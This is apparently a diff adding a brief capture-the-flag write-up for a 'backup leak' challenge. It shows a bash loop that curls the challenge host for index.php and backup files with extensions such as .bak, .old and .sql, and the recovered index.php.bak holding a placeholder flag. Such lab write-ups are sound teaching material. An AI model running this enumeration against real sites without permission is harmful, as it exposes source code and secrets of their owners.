@@ -1,0 +1,21 @@
+
+--> target given/to find backup file which have the flag
+
+custom command i made:
+for ext in .bak .backup .old .zip .tar.gz .sql; do
+curl https://backup-leak.secleaf.tech/index.php$ext
+curl https://backup-leak.secleaf.tech/backup$ext
+done
+
+it checks all file extension for index.php
+
+--> found flag at https://backup-leak.secleaf.tech/index.php.bak
+
+response:
+
+<?php 
+$flag = "SecLeaf{flag}";
+echo "<h1>Development Backup</h1>";
+?>
+
+> "solved it"
